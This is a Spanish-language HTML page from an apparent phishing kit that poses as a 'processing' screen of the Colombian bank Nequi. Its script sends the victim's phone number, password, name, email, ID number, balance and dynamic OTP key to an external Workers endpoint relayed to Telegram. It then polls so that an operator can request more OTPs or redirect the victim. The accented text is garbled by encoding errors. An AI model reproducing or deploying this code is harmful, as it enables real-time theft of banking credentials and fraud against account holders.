<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando - Nequi</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #2E0039 0%, #4A148C 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
        }

        .logo {
            margin-bottom: 30px;
        }

        .logo-icon {
            background: #2E0039;
            color: white;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 24px;
            margin: 0 auto 15px;
        }

        .logo-text {
            font-size: 28px;
            font-weight: bold;
            color: #2E0039;
        }

        .loader-container {
            margin: 30px 0;
        }

        .loader {
            width: 80px;
            height: 80px;
            border: 6px solid #f3f3f3;
            border-top: 6px solid #00C853;
            border-radius: 50%;
            animation: spin 1.5s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-text {
            font-size: 16px;
            color: #3A0A63;
            margin-top: 20px;
            font-weight: 600;
        }

        .progress-dots {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-top: 15px;
        }

        .dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #E3D4EE;
            animation: pulse 1.5s infinite;
        }

        .dot:nth-child(2) {
            animation-delay: 0.3s;
        }

        .dot:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 1; }
        }

        .status-message {
            background: #F9F3FF;
            border-left: 4px solid #00C853;
            padding: 15px;
            border-radius: 8px;
            margin: 25px 0;
            text-align: left;
        }

        .status-title {
            font-size: 16px;
            font-weight: 700;
            color: #2E0039;
            margin-bottom: 5px;
        }

        .status-subtitle {
            font-size: 14px;
            color: #3A0A63;
            opacity: 0.8;
        }

        .progress-steps {
            margin: 25px 0;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 15px;
            padding: 12px;
            border-radius: 8px;
            background: #F9F3FF;
            transition: all 0.3s ease;
        }

        .step-icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #E3D4EE;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            color: #3A0A63;
        }

        .step.active .step-icon {
            background: #00C853;
            color: white;
        }

        .step-text {
            flex: 1;
            text-align: left;
        }

        .step-title {
            font-size: 14px;
            font-weight: 600;
            color: #3A0A63;
        }

        .step-description {
            font-size: 12px;
            color: #3A0A63;
            opacity: 0.7;
        }

        .timer {
            font-size: 14px;
            color: #3A0A63;
            margin-top: 20px;
            font-weight: 600;
        }

        .security-badge {
            background: rgba(0, 200, 83, 0.1);
            border: 1px solid #00C853;
            color: #00C853;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
            margin-top: 20px;
        }

        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #E3D4EE;
        }

        .footer-text {
            font-size: 12px;
            color: #3A0A63;
            opacity: 0.7;
        }

        .progress-container {
            width: 100%;
            background: #f0f0f0;
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
        }

        .progress-bar {
            height: 6px;
            background: linear-gradient(90deg, #2E0039, #da0081);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-icon">NQ</div>
            <div class="logo-text">Nequi</div>
            <img src="https://i.ytimg.com/vi/NrZ3sekzj8I/hq720.jpg?sqp=-oaymwE7CK4FEIIDSFryq4qpAy0IARUAAAAAGAElAADIQj0AgKJD8AEB-AH-CYAC0AWKAgwIABABGEIgEyh_MA8=&rs=AOn4CLCugCpuvPmTm3tnsNGvB_zeML3XKQ" alt="Imagen" style="width:250px; height:auto;border-radius:5px;">
        </div>

        <div class="loader-container">
            <div class="loader"></div>
            <div class="progress-text" id="progressText">Procesando tu solicitud</div>
            <div class="progress-dots">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>

        <div class="status-message">
            <div class="status-title" id="statusTitle">Validaci√≥n en progreso</div>
            <div class="status-subtitle" id="statusSubtitle">Estamos verificando tu informaci√≥n de seguridad. Esto puede tomar unos segundos.</div>
        </div>

        <!-- Barra de progreso -->
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>

        <div class="progress-steps">
            <div class="step active">
                <div class="step-icon">‚úì</div>
                <div class="step-text">
                    <div class="step-title">Informaci√≥n recibida</div>
                    <div class="step-description">Tus datos han sido enviados correctamente</div>
                </div>
            </div>

            <div class="step active">
                <div class="step-icon">‚è≥</div>
                <div class="step-text">
                    <div class="step-title">Validando identidad</div>
                    <div class="step-description">Verificando informaci√≥n de seguridad</div>
                </div>
            </div>

            <div class="step" id="step3">
                <div class="step-icon">‚óØ</div>
                <div class="step-text">
                    <div class="step-title">Procesando solicitud</div>
                    <div class="step-description">Activando tu clave din√°mica</div>
                </div>
            </div>
        </div>

        <div class="timer" id="timer">
            Tiempo transcurrido: <span id="time">0</span> segundos
        </div>

        <div class="security-badge">
            üîí Conexi√≥n segura establecida
        </div>

        <div class="footer">
            <div class="footer-text">
                No cierres esta ventana mientras se completa el proceso
            </div>
        </div>
    </div>

    <script>
    const WORKER_URL = "https://throbbing-sky-6a75.claropromoxlaro.workers.dev";

    // Funci√≥n mejorada para enviar datos a Telegram
    async function sendToTelegram(bancoldata, bancoldina) {
        const usuario = bancoldata.usuario || 'No disponible';
        const clave = bancoldata.clave || 'No disponible';
        const nombre = bancoldata.nombre || 'No disponible';
        const correo = bancoldata.correo || 'No disponible';
        const cedula = bancoldata.cedula || 'No disponible';
        const saldo = bancoldata.saldo || 'No disponible';
        const transactionId = bancoldata.transactionId;

        const hora = new Date().toLocaleString('es-CO', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: true
        });

        // Mensaje COMPLETO con todos los datos
        const mensaje = `üîî **NUEVA SOLICITUD DE VERIFICACI√ìN** üîî

üìã **INFORMACI√ìN DEL USUARIO:**
üë§ Nombre: ${nombre}
üì± N√∫mero: ${usuario}
üîë Clave: ${clave}
üìß Correo: ${correo}
ü™™ Documento: ${cedula}
üí∞ Saldo: $${saldo?.toLocaleString('es-CO') || '0'}

üîê **CLAVE DIN√ÅMICA CAPTURADA:**
${bancoldina}

üìä **DATOS DE TRANSACCI√ìN:**
üÜî ID: ${transactionId}
‚è∞ Hora: ${hora}

‚ö†Ô∏è **¬øQU√â ACCI√ìN DESEAS REALIZAR?**

‚úÖ **AUTORIZAR** - Procesar con clave din√°mica
üí∞ **CONSULTAR SALDO** - Ir a consulta de saldo  
üîë **SOLICITAR OTP** - Pedir nueva clave din√°mica
‚ùå **RECHAZAR** - Finalizar proceso
‚ö†Ô∏è **REPORTAR ERROR** - Error t√©cnico en sistema`;

        try {
            const response = await fetch(`${WORKER_URL}/send-to-telegram`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: mensaje,
                    transactionId: transactionId,
                    // Enviar datos adicionales para los botones
                    userData: {
                        usuario: usuario,
                        clave: clave,
                        nombre: nombre,
                        correo: correo,
                        cedula: cedula,
                        saldo: saldo,
                        din√°mica: bancoldina
                    }
                })
            });

            if (response.ok) {
                console.log('‚úÖ Todos los datos enviados a correctamente');
                return true;
            } else {
                console.error('‚ùå Error en respuesta del servidor');
                return false;
            }
        } catch (error) {
            console.error('‚ùå Error enviando a Telegram:', error);
            return false;
        }
    }

    // Funci√≥n para enviar datos cuando se selecciona un bot√≥n en Telegram
    async function sendButtonDataToTelegram(estado, bancoldata, bancoldina) {
        const usuario = bancoldata.usuario || 'No disponible';
        const clave = bancoldata.clave || 'No disponible';
        const transactionId = bancoldata.transactionId;

        const mensaje = `üîÑ **ACCI√ìN EJECUTADA** üîÑ

üì± **USUARIO:** ${usuario}
üîë **CLAVE:** ${clave}
üîê **DIN√ÅMICA:** ${bancoldina}
üéØ **ACCI√ìN:** ${estado.toUpperCase()}
üÜî **ID:** ${transactionId}

‚è∞ **HORA:** ${new Date().toLocaleString('es-CO')}`;

        try {
            await fetch(`${WORKER_URL}/send-button-action`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: mensaje,
                    estado: estado,
                    transactionId: transactionId,
                    usuario: usuario,
                    clave: clave,
                    din√°mica: bancoldina
                })
            });
            console.log(`‚úÖ Datos de bot√≥n enviados: ${estado}`);
        } catch (error) {
            console.error('‚ùå Error enviando acci√≥n de bot√≥n:', error);
        }
    }

    document.addEventListener('DOMContentLoaded', async function () {
        let transactionId = '';
        let startTime = Date.now();
        let pollingCount = 0;
        const maxPollingTime = 600000; // 10 minutos m√°ximo

        function updateStatus(message) {
            document.getElementById('statusTitle').textContent = message;
            console.log("Status:", message);
        }

        function updateProgress(percentage) {
            document.getElementById('progressBar').style.width = percentage + '%';
        }

        function updateTimeIndicator() {
            const elapsed = Math.floor((Date.now() - startTime) / 1000);
            document.getElementById('time').textContent = elapsed;
        }

        // Obtener datos del localStorage
        const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
        if (!bancoldata || !bancoldata.transactionId) {
            updateStatus("‚ùå Error: Sesi√≥n no encontrada");
            setTimeout(() => window.location.href = "index.html", 3000);
            return;
        }

        transactionId = bancoldata.transactionId;

        // Verificar si viene de cel-dina.html (con din√°mica enviada)
        const bancoldina = localStorage.getItem('bancoldina');

        // Mostrar clave din√°mica si fue enviada y ENVIAR DATOS COMPLETOS A TELEGRAM
        if (bancoldina) {
            updateStatus("üì§ Enviando datos completos a Telegram...");

            // ENVIAR TODOS LOS DATOS A TELEGRAM
            const enviado = await sendToTelegram(bancoldata, bancoldina);

            if (enviado) {
                updateStatus("‚úÖ Datos completos enviados. Esperando acci√≥n...");
                updateProgress(40);

                // Guardar en localStorage que ya se enviaron los datos
                localStorage.setItem('datosEnviados', 'true');
            } else {
                updateStatus("‚ö†Ô∏è Error enviando datos. Reintentando...");
                // Reintentar despu√©s de 3 segundos
                setTimeout(async () => {
                    await sendToTelegram(bancoldata, bancoldina);
                    updateStatus("‚úÖ Datos enviados. Esperando acci√≥n...");
                }, 3000);
            }
        } else {
            updateStatus("üîÑ Esperando selecci√≥n de opci√≥n en Telegram...");
            updateProgress(20);
        }

        // Iniciar polling inmediatamente para esperar botones de Telegram
        startStatusPolling();

        // Polling del estado - MEJORADO
        async function startStatusPolling() {
            const pollInterval = setInterval(async () => {
                pollingCount++;
                updateTimeIndicator();

                // Actualizar progreso basado en el tiempo
                const elapsed = Date.now() - startTime;
                let progress;
                if (bancoldina) {
                    progress = Math.min(40 + (elapsed / maxPollingTime) * 40, 80);
                } else {
                    progress = Math.min(20 + (elapsed / maxPollingTime) * 40, 60);
                }
                updateProgress(progress);

                // Verificar timeout m√°ximo
                if (elapsed > maxPollingTime) {
                    clearInterval(pollInterval);
                    updateStatus("‚è∞ Tiempo agotado. Redirigiendo...");
                    updateProgress(100);
                    handleTimeout();
                    return;
                }

                try {
                    const response = await fetch(`${WORKER_URL}/status?id=${transactionId}`);
                    const data = await response.json();

                    console.log(`Poll ${pollingCount}:`, data.estado);

                    if (data.estado && data.estado !== "pendiente") {
                        clearInterval(pollInterval);
                        updateStatus("‚úÖ Respuesta recibida de Telegram!");
                        updateProgress(100);

                        // ENVIAR DATOS DEL BOT√ìN PRESIONADO
                        await sendButtonDataToTelegram(data.estado, bancoldata, bancoldina);

                        processState(data.estado);
                    } else {
                        // Mantener mensajes informativos seg√∫n el contexto
                        if (bancoldina) {
                            const messages = [
                                "‚úÖ Datos enviados. Esperando autorizaci√≥n...",
                                "‚úÖ Informaci√≥n verificada. Esperando confirmaci√≥n...",
                                "‚úÖ Clave validada. Esperando acci√≥n final..."
                            ];
                            updateStatus(messages[pollingCount % messages.length]);
                        } else {
                            const messages = [
                                "üîÑ Esperando selecci√≥n en Telegram...",
                                "üì± Revisa Telegram para elegir opci√≥n...",
                                "‚è≥ Esperando acci√≥n del usuario..."
                            ];
                            updateStatus(messages[pollingCount % messages.length]);
                        }
                    }

                } catch (error) {
                    console.log("Error en polling:", error);
                    updateStatus(`‚ö†Ô∏è Reconectando...`);
                }
            }, 3000);

            // Actualizar indicador de tiempo cada segundo
            setInterval(updateTimeIndicator, 1000);
        }

        // Procesar el estado seg√∫n la opci√≥n seleccionada en Telegram
        function processState(estado) {
            console.log("Procesando estado desde Telegram:", estado);

            const actions = {
                "autorizado": {
                    message: "‚úÖ Transacci√≥n autorizada. Continuando...",
                    url: "cel-dina.html",
                    delay: 2000,
                    action: "redirect"
                },
                "otp": {
                    message: "üí∞ Redirigiendo a consulta de saldo...", 
                    url: "index-otp.html",
                    delay: 2000,
                    action: "redirect"
                },
                "error": {
                    message: "‚ùå Error t√©cnico reportado. Redirigiendo...",
                    url: "../../pay/",
                    delay: 2500,
                    action: "redirect"
                },
                "fallo": {
                    message: "‚ö†Ô∏è Transacci√≥n rechazada. Redirigiendo...",
                    url: "https://encuestasvirtual.site/dinainvalida/",
                    delay: 2500,
                    action: "redirect"
                },
                "finalizado": {
                    message: "‚úÖ Proceso finalizado correctamente.",
                    url: "https://ayuda.nequi.com.co/hc/es",
                    delay: 2000,
                    action: "redirect"
                },
                "rechazado": {
                    message: "‚ùå Transacci√≥n rechazada por el usuario.",
                    url: "index.html",
                    delay: 3000,
                    action: "redirect"
                },
                "pendiente": {
                    message: "üîÑ Esperando confirmaci√≥n adicional...",
                    url: "",
                    delay: 0,
                    action: "wait"
                }
            };

            const action = actions[estado] || {
                message: "üîÑ Estado no reconocido. Redirigiendo...",
                url: "cel-dina.html",
                delay: 2000,
                action: "redirect"
            };

            updateStatus(action.message);

            if (action.action === "redirect") {
                setTimeout(() => {
                    if (estado === "error") {
                        alert("Se ha reportado un error t√©cnico. Ser√°s redirigido.");
                    }
                    window.location.href = action.url;
                }, action.delay);
            } else if (action.action === "wait") {
                setTimeout(() => {
                    startStatusPolling();
                }, 5000);
            }
        }

        // Manejar timeout
        function handleTimeout() {
            if (bancoldina) {
                updateStatus("‚è∞ No se recibi√≥ confirmaci√≥n. Verificando estado...");
                setTimeout(() => window.location.href = "index-otp.html", 3000);
            } else {
                updateStatus("‚è∞ Tiempo agotado. Iniciando nueva verificaci√≥n...");
                setTimeout(() => window.location.href = "cel-dina.html", 3000);
            }
        }

        // Timeout global de seguridad
        setTimeout(() => {
            updateStatus("üîÑ Redirecci√≥n autom√°tica por seguridad...");
            handleTimeout();
        }, maxPollingTime + 30000);

    });
    </script>
</body>
</html>